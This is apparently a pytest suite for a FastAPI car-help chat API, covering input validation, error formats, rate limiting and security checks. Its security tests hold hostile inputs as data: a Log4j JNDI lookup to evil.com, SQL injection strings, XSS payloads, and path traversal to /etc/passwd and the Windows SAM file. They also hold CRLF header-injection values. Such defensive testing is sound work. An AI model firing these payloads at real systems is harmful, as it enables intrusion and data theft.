"""
Test advanced API validation and error handling.
Following the project's test-first development approach with real API integration.
"""

import pytest
from fastapi.testclient import TestClient
import sys
import os
import json
import uuid
import time
from datetime import datetime

# Add the backend directory to the Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from app.api.app import create_app
from app.config import config


class TestRequestValidation:
    """Test advanced request validation and input sanitization."""
    
    @pytest.fixture
    def client(self):
        """Create test client for validation tests."""
        app = create_app()
        return TestClient(app)
    
    @pytest.fixture
    def sample_user_id(self):
        """Generate unique user ID for testing."""
        return f"test_user_{uuid.uuid4().hex[:8]}"
    
    def test_message_length_validation(self, client, sample_user_id):
        """Test message length limits and validation."""
        # Test extremely long message
        long_message = "x" * 5001  # Exceeds 5000 character limit
        
        chat_request = {
            "message": long_message,
            "user_id": sample_user_id,
            "language": "en"
        }
        
        response = client.post("/chat", json=chat_request)
        assert response.status_code == 422
        
        data = response.json()
        assert "error" in data
        assert data["error"] is True
        assert "error_code" in data
        assert data["error_code"] == "VALIDATION_ERROR"
        assert "message" in data
        assert "validation_errors" in data
        
        # Should have validation error details
        validation_errors = data["validation_errors"]
        assert len(validation_errors) > 0
        assert any("message" in error["field"] for error in validation_errors)
        
        # Should mention message length or validation error
        error_message = data["message"].lower()
        assert any(term in error_message for term in ["validation", "failed"])
    
    def test_user_id_validation(self, client):
        """Test user ID format validation and sanitization."""
        invalid_user_ids = [
            "",  # Empty
            " ",  # Whitespace only
            "x" * 101,  # Too long (over 100 chars)
            "user<script>alert('xss')</script>",  # XSS attempt
            "user\nwith\nnewlines",  # Newlines
            "user\twith\ttabs",  # Tabs
        ]
        
        for invalid_user_id in invalid_user_ids:
            chat_request = {
                "message": "Test message",
                "user_id": invalid_user_id,
                "language": "en"
            }
            
            response = client.post("/chat", json=chat_request)
            assert response.status_code == 422, f"Should reject user_id: {repr(invalid_user_id)}"
    
    def test_language_code_validation(self, client, sample_user_id):
        """Test language code validation."""
        invalid_languages = ["es", "fr", "invalid", "", "english", "georgian"]
        
        for invalid_lang in invalid_languages:
            chat_request = {
                "message": "Test message",
                "user_id": sample_user_id,
                "language": invalid_lang
            }
            
            response = client.post("/chat", json=chat_request)
            assert response.status_code == 422, f"Should reject language: {invalid_lang}"
    
    def test_conversation_id_validation(self, client, sample_user_id):
        """Test conversation ID format validation."""
        invalid_conversation_ids = [
            "not-a-uuid",
            "12345",
            "conversation_id_with_special_chars!@#",
            "",
            " "
        ]
        
        for invalid_conv_id in invalid_conversation_ids:
            chat_request = {
                "message": "Test message",
                "user_id": sample_user_id,
                "conversation_id": invalid_conv_id,
                "language": "en"
            }
            
            response = client.post("/chat", json=chat_request)
            # Should either validate and reject, or handle gracefully
            assert response.status_code in [400, 404, 422], f"Should handle invalid conversation_id: {invalid_conv_id}"
    
    def test_input_sanitization(self, client, sample_user_id):
        """Test that inputs are properly sanitized."""
        malicious_inputs = [
            "<script>alert('xss')</script>My car won't start",
            "My car has issues\x00with null bytes",
            "Engine problem\r\nwith CRLF injection",
            "Brake issue <!-- with HTML comments -->",
            "My car ${jndi:ldap://evil.com/a} won't start",  # Log4j style
        ]
        
        for malicious_input in malicious_inputs:
            chat_request = {
                "message": malicious_input,
                "user_id": sample_user_id,
                "language": "en"
            }
            
            response = client.post("/chat", json=chat_request)
            if response.status_code == 200:
                data = response.json()
                # Response should be sanitized and not contain executable malicious content
                response_text = data["response"]
                # Check that dangerous executable content is not present
                assert "<script>" not in response_text.lower()
                assert "\x00" not in response_text
                # The AI might mention the injection attempt, but it shouldn't execute it
                # So we check that it's mentioned in a safe context (explaining the security issue)
                if "jndi:" in response_text:
                    # If mentioned, it should be in a security warning context
                    response_lower = response_text.lower()
                    assert any(term in response_lower for term in ["security", "injection", "attempt", "code", "issue"])
    
    def test_json_structure_validation(self, client):
        """Test JSON structure and content type validation."""
        # Invalid JSON
        response = client.post("/chat", data="invalid json", headers={"Content-Type": "application/json"})
        assert response.status_code == 422
        
        # Missing required fields
        incomplete_requests = [
            {},  # Empty object
            {"message": "test"},  # Missing user_id
            {"user_id": "test"},  # Missing message
            {"message": "test", "user_id": "test", "extra_field": "should_be_ignored"},  # Extra fields
        ]
        
        for incomplete_request in incomplete_requests:
            response = client.post("/chat", json=incomplete_request)
            if "extra_field" in incomplete_request:
                # Extra fields should be ignored, not cause errors
                assert response.status_code in [200, 422]  # Depends on missing required fields
            else:
                assert response.status_code == 422
    
    def test_content_type_validation(self, client, sample_user_id):
        """Test content type header validation."""
        valid_request = {
            "message": "Test message",
            "user_id": sample_user_id,
            "language": "en"
        }
        
        # Test with wrong content type
        response = client.post("/chat", data=json.dumps(valid_request), 
                             headers={"Content-Type": "text/plain"})
        assert response.status_code == 422
        
        # Test with no content type - FastAPI can handle this gracefully
        response = client.post("/chat", data=json.dumps(valid_request))
        assert response.status_code in [200, 422]  # Either handles gracefully or rejects


class TestErrorHandling:
    """Test comprehensive error handling and response formatting."""
    
    @pytest.fixture
    def client(self):
        """Create test client for error handling tests."""
        app = create_app()
        return TestClient(app)
    
    @pytest.fixture
    def sample_user_id(self):
        """Generate unique user ID for testing."""
        return f"test_user_{uuid.uuid4().hex[:8]}"
    
    def test_404_error_handling(self, client):
        """Test 404 error handling for non-existent endpoints."""
        response = client.get("/nonexistent")
        assert response.status_code == 404
        
        data = response.json()
        assert "detail" in data
        assert data["detail"] == "Not Found"
    
    def test_405_method_not_allowed(self, client):
        """Test 405 error for unsupported HTTP methods."""
        # Try DELETE on chat endpoint (should only support POST)
        response = client.delete("/chat")
        assert response.status_code == 405
        
        data = response.json()
        assert "detail" in data
        assert "method not allowed" in data["detail"].lower()
    
    def test_422_validation_error_format(self, client):
        """Test that 422 validation errors have proper format."""
        invalid_request = {
            "message": "",  # Empty message should fail validation
            "user_id": "",  # Empty user_id should fail validation
            "language": "invalid"  # Invalid language should fail validation
        }
        
        response = client.post("/chat", json=invalid_request)
        assert response.status_code == 422
        
        data = response.json()
        assert "error" in data
        assert data["error"] is True
        assert "error_code" in data
        assert data["error_code"] == "VALIDATION_ERROR"
        assert "validation_errors" in data
        
        # Should have detailed validation error information
        validation_errors = data["validation_errors"]
        assert len(validation_errors) > 0
        for error in validation_errors:
            assert "field" in error  # Field location
            assert "message" in error  # Error message
            assert "code" in error  # Error type
    
    def test_500_internal_server_error_handling(self, client):
        """Test 500 error handling for server errors."""
        # This test might be challenging to trigger naturally
        # We'll test the error handling structure by checking logs
        # and ensuring 500 errors are properly formatted when they occur
        
        # Test with a request that might cause internal errors
        chat_request = {
            "message": "Test message",
            "user_id": "test_user_for_500_test",
            "language": "en"
        }
        
        response = client.post("/chat", json=chat_request)
        
        # If we get a 500 error, it should be properly formatted
        if response.status_code == 500:
            data = response.json()
            assert "detail" in data
            assert isinstance(data["detail"], str)
            # Should not expose internal details in production
            assert "traceback" not in data["detail"].lower()
            assert "exception" not in data["detail"].lower()
    
    def test_error_response_consistency(self, client):
        """Test that all error responses have consistent format."""
        # Test different types of errors
        error_tests = [
            ("GET", "/nonexistent", {}, 404),
            ("POST", "/chat", {}, 422),
            ("DELETE", "/chat", {}, 405),
        ]
        
        for method, url, data, expected_status in error_tests:
            if method == "GET":
                response = client.get(url)
            elif method == "POST":
                response = client.post(url, json=data)
            elif method == "DELETE":
                response = client.delete(url)
            
            assert response.status_code == expected_status
            
            response_data = response.json()
            # Check for our enhanced error format
            if expected_status == 422:
                assert "error" in response_data
                assert "error_code" in response_data
                assert "validation_errors" in response_data
            else:
                # For other errors, check for basic structure
                assert "error" in response_data or "detail" in response_data
                assert "message" in response_data or "detail" in response_data
    
    def test_cors_error_handling(self, client):
        """Test CORS error handling for cross-origin requests."""
        # Test with CORS headers
        headers = {
            "Origin": "https://example.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type"
        }
        
        # OPTIONS request for CORS preflight
        response = client.options("/chat", headers=headers)
        # Should either allow CORS or handle gracefully
        assert response.status_code in [200, 204, 405]
    
    def test_large_payload_handling(self, client, sample_user_id):
        """Test handling of extremely large payloads."""
        # Create a large but valid request
        large_message = "My car has issues. " * 200  # Still under 5000 chars
        
        chat_request = {
            "message": large_message,
            "user_id": sample_user_id,
            "language": "en"
        }
        
        response = client.post("/chat", json=chat_request)
        # Should either handle gracefully or reject appropriately
        assert response.status_code in [200, 413, 422]
        
        if response.status_code == 413:
            data = response.json()
            assert "detail" in data


class TestRateLimiting:
    """Test rate limiting and abuse prevention."""
    
    @pytest.fixture
    def client(self):
        """Create test client for rate limiting tests."""
        app = create_app()
        return TestClient(app)
    
    @pytest.fixture
    def sample_user_id(self):
        """Generate unique user ID for testing."""
        return f"test_user_{uuid.uuid4().hex[:8]}"
    
    def test_rapid_requests_handling(self, client, sample_user_id):
        """Test handling of rapid successive requests."""
        chat_request = {
            "message": "Quick test message",
            "user_id": sample_user_id,
            "language": "en"
        }
        
        # Send multiple rapid requests
        responses = []
        for i in range(5):
            response = client.post("/chat", json=chat_request)
            responses.append(response)
        
        # All should either succeed or be rate-limited appropriately
        for response in responses:
            assert response.status_code in [200, 429, 503]
            
            if response.status_code == 429:
                data = response.json()
                assert "detail" in data
                # Should indicate rate limiting
                detail_text = data["detail"].lower()
                assert any(term in detail_text for term in ["rate", "limit", "too many", "requests"])
    
    def test_concurrent_requests_handling(self, client, sample_user_id):
        """Test handling of concurrent requests from the same user."""
        import threading
        import queue
        
        chat_request = {
            "message": "Concurrent test message",
            "user_id": sample_user_id,
            "language": "en"
        }
        
        results = queue.Queue()
        
        def make_request():
            try:
                response = client.post("/chat", json=chat_request)
                results.put(response.status_code)
            except Exception as e:
                results.put(f"error: {e}")
        
        # Create multiple threads to simulate concurrent requests
        threads = []
        for i in range(3):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=30)  # 30 second timeout
        
        # Check results
        status_codes = []
        while not results.empty():
            result = results.get()
            if isinstance(result, int):
                status_codes.append(result)
        
        # Should handle concurrent requests gracefully
        for status_code in status_codes:
            assert status_code in [200, 429, 503]


class TestSecurityValidation:
    """Test security-related validation and protection."""
    
    @pytest.fixture
    def client(self):
        """Create test client for security tests."""
        app = create_app()
        return TestClient(app)
    
    @pytest.fixture
    def sample_user_id(self):
        """Generate unique user ID for testing."""
        return f"test_user_{uuid.uuid4().hex[:8]}"
    
    def test_sql_injection_protection(self, client, sample_user_id):
        """Test protection against SQL injection attempts."""
        sql_injection_attempts = [
            "'; DROP TABLE conversations; --",
            "' OR '1'='1",
            "'; INSERT INTO messages VALUES ('evil'); --",
            "' UNION SELECT * FROM conversations; --",
        ]
        
        for injection_attempt in sql_injection_attempts:
            chat_request = {
                "message": f"My car has problems {injection_attempt}",
                "user_id": sample_user_id,
                "language": "en"
            }
            
            response = client.post("/chat", json=chat_request)
            # Should either sanitize and proceed or reject
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                # Response should not contain SQL injection artifacts
                data = response.json()
                response_text = data["response"].lower()
                assert "drop table" not in response_text
                assert "insert into" not in response_text
                assert "union select" not in response_text
    
    def test_xss_protection(self, client, sample_user_id):
        """Test protection against XSS attacks."""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(`xss`)'></iframe>",
        ]
        
        for xss_attempt in xss_attempts:
            chat_request = {
                "message": f"My car problem: {xss_attempt}",
                "user_id": sample_user_id,
                "language": "en"
            }
            
            response = client.post("/chat", json=chat_request)
            
            if response.status_code == 200:
                data = response.json()
                response_text = data["response"]
                # Response should not contain executable JavaScript
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
    
    def test_path_traversal_protection(self, client):
        """Test protection against path traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        for traversal_attempt in path_traversal_attempts:
            # Test in conversation history endpoint
            response = client.get(f"/conversations/{traversal_attempt}")
            # Should reject or handle safely (200 with empty results is also safe)
            assert response.status_code in [200, 400, 404, 422]
            
            # If 200, should not expose sensitive information
            if response.status_code == 200:
                data = response.json()
                # Should return empty or safe data, not system files
                assert "conversations" in data
                conversations = data["conversations"]
                assert isinstance(conversations, list)
    
    def test_header_injection_protection(self, client, sample_user_id):
        """Test protection against header injection attacks."""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected-Header: evil",
            "User-Agent": "Mozilla/5.0\r\nX-Injected: true",
            "Referer": "http://example.com\r\nLocation: http://evil.com",
        }
        
        chat_request = {
            "message": "Test message",
            "user_id": sample_user_id,
            "language": "en"
        }
        
        response = client.post("/chat", json=chat_request, headers=malicious_headers)
        # Should handle without being affected by header injection
        assert response.status_code in [200, 400]
        
        # Check that injected headers aren't reflected in response
        response_headers = dict(response.headers)
        assert "X-Injected-Header" not in response_headers
        assert "X-Injected" not in response_headers 